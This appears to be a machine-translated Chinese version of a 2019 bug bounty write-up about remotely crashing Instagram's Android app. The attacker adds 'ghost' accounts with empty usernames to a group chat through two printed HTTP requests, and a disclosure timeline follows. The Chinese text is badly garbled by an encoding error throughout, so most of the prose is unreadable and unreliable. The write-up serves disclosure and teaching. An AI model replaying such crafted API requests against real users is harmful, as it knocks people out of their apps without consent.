# ä¸¤ä¸ªæ­»äº¡è´¦å·å¦‚ä½•è®©ä»»ä½• Instagram android ç”¨æˆ·è¿œç¨‹å´©æºƒ

> åŸæ–‡ï¼š<https://infosecwriteups.com/how-two-dead-users-allowed-remote-crash-of-any-instagram-android-user-8f20e88b1b59?source=collection_archive---------0----------------------->

![](img/aab2af5b90e45615b2fc5014243c0ad7.png)

# ä»‹ç»

![](img/f07480e941bf262056459cb952ffc5d5.png)

2019 å¹´ 4 æœˆï¼Œæˆ‘æœ‰äº†æµ‹è¯•è„¸ä¹¦å®‰å…¨(æ›´å…·ä½“åœ°è¯´æ˜¯ Instagram å®‰å…¨)çš„æ„šè ¢æƒ³æ³•ï¼Œåœ¨æˆ‘å¾—çŸ¥è¯¥å…¬å¸åœ¨ä»–ä»¬çš„èµ„äº§ä¸Šå¯ç”¨äº†ä¸€ç§æ–°çš„è®¾ç½®(ç§°ä¸º Whitehat Settings)ï¼Œä½¿ç ”ç©¶äººå‘˜æ›´å®¹æ˜“å‘ç°æ–°çš„æ¼æ´(é”å®šä¸æ˜¯é—®é¢˜ï¼Œæˆ‘åªæ˜¯æœ‰æ—¶æœ‰ç‚¹æ‡’:P)ã€‚åœ¨æˆ‘æœ€åˆçš„ç ”ç©¶ä¸­ï¼Œæˆ‘å¾—å‡ºç»“è®ºï¼ŒInstagram åœ¨å…¶æ•°æ®åº“ä¸­ä½¿ç”¨ç®€å•çš„å¢é‡ PKI æ¥å®šä¹‰å¹³å°ä¸Šçš„ç”¨æˆ·å¸æˆ·ï¼Œå› æ­¤æˆ‘å¾ˆå¥½å¥‡ï¼Œæƒ³ç¡®å®šå“ªäº›æ˜¯ç¤¾äº¤ç½‘ç»œä¸Šåˆ›å»ºçš„ç¬¬ä¸€æ‰¹å¸æˆ·ã€‚å—¯ï¼Œç¬¬ä¸€æ‰¹è´¦æˆ·ä¸­çš„ä¸€ä¸ª(æˆ‘ä¸ç¡®å®š PKID æ˜¯ 3 è¿˜æ˜¯ 4)ï¼Œå±äº Mike Krieger(insta gram è”åˆåˆ›å§‹äººä¹‹ä¸€)ã€‚

![](img/fd91e6efac3aa6da6aee26e20738ff29.png)

æ˜¯çš„ï¼Œæœ‰ç‚¹æ˜¾è€Œæ˜“è§â€¦â€¦ä½†æ˜¯ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ª Instagram è´¦æˆ·(PKID = 1 & PKID=2)å‘¢ï¼Ÿå®ƒä»¬æœ‰ç‚¹ä¸å¯»å¸¸ï¼Œå› ä¸ºå®ƒä»¬ä¸ä¸€ä¸ª ID ç›¸å…³è”ï¼Œè€Œä¸”å®ƒä»¬çš„ç”¨æˆ·åæ²¡æœ‰è¢«å¡«å……:æ›´å‡†ç¡®åœ°è¯´ï¼Œå®ƒä»¬çš„ç”¨æˆ·åå­—æ®µåŒ…å«ä¸€ä¸ªç©ºå­—ç¬¦ä¸²("")ï¼Œæˆ‘å‡ ä¹å¯ä»¥è‚¯å®šè¿™ç§è¡Œä¸ºä¼šäº§ç”Ÿä¸€äº›é—®é¢˜ã€‚æˆ‘çš„æƒ³æ³•æ˜¯ï¼Œè¿™äº›è´¦æˆ·æ˜¯åœ¨ Instagram çš„åˆå§‹æµ‹è¯•é˜¶æ®µåˆ›å»ºçš„ï¼Œå½“æ—¶å®ƒåªä¸è¿‡æ˜¯ä¸€ä¸ª alpha ç‰ˆæœ¬ã€‚æ­¤å¤–ï¼Œæˆ‘æƒ³çŸ¥é“ä¸ºä»€ä¹ˆè¿‡äº†è¿™ä¹ˆé•¿æ—¶é—´å®ƒä»¬ä»ç„¶æ²¡æœ‰è¢«ç§»èµ°ï¼Ÿä½†æ˜¯æ²¡æœ‰äººå›åº”è¿™ä¸ªç–‘é—®ã€‚ä»ç°åœ¨å¼€å§‹ï¼Œè®©æˆ‘ä»¬ç§°ä»–ä»¬ä¸ºå¹½çµç”¨æˆ·ğŸ˜¯

![](img/a3e40eb53779c930355121903f9059a0.png)

å›åˆ°æˆ‘ä»¬è¿™é‡Œï¼Œå¦‚æœæ²¡æœ‰æœåŠ¡å™¨ç«¯ä»£ç çš„æ­£ç¡®ç®¡ç†ï¼Œç©ºå­—ç¬¦ä¸²æœ‰æ—¶å¯èƒ½æ˜¯å±é™©çš„:äº‹å®ä¸Šï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯æ‰¾åˆ°ä¸€ç§æ–¹æ³•ï¼Œé€šè¿‡åˆ©ç”¨å¯¹ç•¸å½¢æ•°æ®çš„ç³Ÿç³•è§£æï¼Œä½¿ Instagram åº”ç”¨ç¨‹åºå´©æºƒã€‚ç„¶è€Œï¼Œæ›´æœ‰è¶£çš„æ˜¯æ‰¾åˆ°ä¸€ç§è¿œç¨‹å´©æºƒå…¶ä»– Instagram å¸æˆ·çš„æ–¹æ³•ã€‚

æµè§ˆ Instagram çš„å‡ ä¸ªåŠŸèƒ½(Instagram çš„åŠŸèƒ½æ¯”è„¸ä¹¦å°‘ï¼Œä½†åŒæ ·éå¸¸åºå¤§)ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªé€‚åˆè¿™ç§æƒ…å†µçš„åŠŸèƒ½:åœ¨ Instagram messages é€‰é¡¹å¡ä¸­åˆ›å»ºç¾¤çº¿ç¨‹:äº‹å®ä¸Šï¼Œå¯ä»¥åœ¨ Instagram ä¸­ç”¨å…¶ä»–å¸æˆ·åˆ›å»ºèŠå¤©ç¾¤ã€‚å…·ä½“æ¥è¯´ï¼Œæ‰§è¡Œæ“ä½œçš„ç«¯ç‚¹æ˜¯:

```
/api/v1/direct_v2/create_group_thread/
```

# åˆ©ç”¨

## æŠ€æœ¯ç»†èŠ‚

Bug æµ‹è¯•æ˜¯åœ¨ Android ç‰ˆæœ¬ç­‰äº 8.0 çš„ä¸‰æ˜Ÿ Galaxy S8+ä¸Šè¿›è¡Œçš„ï¼Œå¼€å‘é˜¶æ®µéå¸¸çç¢ã€‚

ä¸ºäº†å°è¯•åˆ©ç”¨ç©ºå­—ç¬¦ä¸²é—®é¢˜ï¼Œæˆ‘é¦–å…ˆä¸ä¸€ä¸ªæµ‹è¯•ç”¨æˆ·ä¸€èµ·åˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„ç»„ã€‚æ ¹æ®ç¤ºä¾‹è¯·æ±‚:

```
POST /api/v1/direct_v2/create_group_thread/ HTTP/1.1
User-Agent: Instagram ....
Accept-Language: en-US
Cookie: urlgen= ....
Accept-Encoding: gzip, deflate
Host:i.instagram.com
X-FB-HTTP-Engine: Liger
Connection: close
Content-Length: 353signed_body=d963d5f048924a58712d8bcf7912ac76a7c3c990199c7d59ac25e7990e142f49.{**"recipient_users":"[xxxxxxxxxx]**","_csrftoken":"WBpZmckmENi6eiubd26Osz6SIR3vtowu","thread_title":"bdbdbdbdbdxb","_uid":"12579513534","_uuid":"d18570eb-0663-40f4-bcc3-0c48a5031cee"}&ig_sig_key_version=4
```

è¿™é‡Œé‡è¦çš„ä¸€éƒ¨åˆ†æ˜¯ recipient_users JSON å‚æ•°ï¼Œå®ƒç”±å—å®³è€… instagram ID å¡«å……ã€‚éšåï¼Œæˆ‘ä½¿ç”¨å¦ä¸€ä¸ª API ç«¯ç‚¹å°†ä¸€ä¸ª ghost ç”¨æˆ·æ·»åŠ åˆ°ç°æœ‰ç»„ä¸­:

```
POST /api/v1/direct_v2/threads/**yyyyyyyyyy**/add_user/ HTTP/1.1
User-Agent: Instagram ....
Accept-Language: en-US
Cookie: urlgen= ....
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Host:i.instagram.com
X-FB-HTTP-Engine: Liger
Connection: close
Content-Length: 109_csrftoken=Pod4ZKSSLYUYMPs2TxhN5Xkmsv6xUOsO&**user_ids=["2"]**&_uuid=d18570eb-0663-40f4-bcc3-0c48a5031cee
```

åœ¨ä¸Šé¢çš„è¯·æ±‚ä¸­ï¼Œyyyyyyyyy è¡¨ç¤ºåˆšåˆšåˆ›å»ºçš„ç»„çº¿ç¨‹çš„ ID(ä»å‰é¢çš„ API è°ƒç”¨çš„å“åº”ä¸­è·å¾—), user_ids æ•°ç»„å¡«å……äº†å€¼ 2(ä¸€ä¸ª ghost ç”¨æˆ·çš„ PKID)ã€‚

ç¬¬äºŒæ¬¡è¯·æ±‚åï¼Œå—å®³è€…çš„ android Instagram åº”ç”¨ç¨‹åºçªç„¶å´©æºƒï¼Œç”¨æˆ·è¢«è¿«æ‰‹åŠ¨ä»ç¾¤ä¸­ç§»é™¤æ‰èƒ½å†æ¬¡ä½¿ç”¨ï¼

![](img/6379d12eddfe9d4ceadde729297f7a40.png)

è¿™å¯èƒ½æ˜¯ç”± ghost ç”¨æˆ·ç”¨æˆ·åä¸­çš„ç©ºå­—ç¬¦ä¸²çš„ JSON è§£æå¼‚å¸¸å¼•èµ·çš„ã€‚ä¸‹é¢æ˜¯å´©æºƒå¯¼è‡´çš„å †æ ˆè·Ÿè¸ªç¤ºä¾‹:

![](img/42a223c65c35a7a52ac9446a30ceb1ad.png)

# å½±å“

åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œåªè¦å°† Instagram android ç”¨æˆ·æ·»åŠ åˆ°ä¸€ä¸ªä»¥ ghost ç”¨æˆ·ä¸ºæˆå‘˜çš„å…¬å…±ç»„çº¿ç¨‹ä¸­ï¼Œå°±æœ‰å¯èƒ½è¿œç¨‹å´©æºƒä»»ä½• insta gram Android ç”¨æˆ·ã€‚æˆ‘æ³¨æ„åˆ°ï¼Œä½ çš„ Instagram ç²‰ä¸ä¸éœ€è¦æ¥å—ä»»ä½•è¯·æ±‚(å¯¹ä»–ä»¬æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§é›¶ç‚¹å‡»åˆ©ç”¨)ï¼Œä½†â€œåŠ å…¥ç¾¤ç»„â€çš„è¯·æ±‚å¿…é¡»ç”±ä¸å…³æ³¨æ”»å‡»è€…çš„ç”¨æˆ·æ¥å—ã€‚

# éªŒè¯æ€§æµ‹è¯•ï¼ˆProof of Concept çš„ç¼©å†™ï¼‰

# æ—¶é—´è¡¨

*   2019 å¹´ 4 æœˆ 10 æ—¥â€”å°±è¯¥ bug è”ç³»è„¸ä¹¦Â·æ€€ç‰¹å“ˆç‰¹å›¢é˜Ÿ
*   2019 å¹´ 4 æœˆ 12 æ—¥â€”è„¸ä¹¦è¦æ±‚æä¾›æ›´å¤šä¿¡æ¯
*   äº”æœˆ 02 æ—¥ã€‚2019/09 2019 å¹´ 9 æœˆ-ç ”ç©¶å‘˜å’Œè„¸ä¹¦ä¹‹é—´äº¤æ¢çš„å„ç§ç”µå­é‚®ä»¶ã€‚æœ€ç»ˆé”™è¯¯ç¡®è®¤
*   2019 å¹´ 9 æœˆ 9 æ—¥â€”é”™è¯¯å·²ä¿®å¤
*   2019 å¹´ 9 æœˆ 10 æ—¥â€”é¢å‘å¥–é‡‘
*   2019 å¹´ 9 æœˆ 12 æ—¥â€”æ¼æ´è¢«æŠ«éœ²

*åŸè½½äº 2019 å¹´ 9 æœˆ 13 æ—¥*[*https://www . valbrux . it*](https://www.valbrux.it/blog/2019/09/13/how-two-dead-users-allowed-remote-crash-of-any-instagram-android-user/)*ã€‚*

*å…³æ³¨* [*Infosec æŠ¥é“*](https://medium.com/bugbountywriteup) *è·å–æ›´å¤šæ­¤ç±»ç²¾å½©æŠ¥é“ã€‚*

[](https://medium.com/bugbountywriteup) [## ä¿¡æ¯å®‰å…¨æŠ¥é“

### æ”¶é›†äº†ä¸–ç•Œä¸Šæœ€å¥½çš„é»‘å®¢çš„æ–‡ç« ï¼Œä¸»é¢˜ä» bug å¥–é‡‘å’Œ CTF åˆ° vulnhubâ€¦

medium.com](https://medium.com/bugbountywriteup)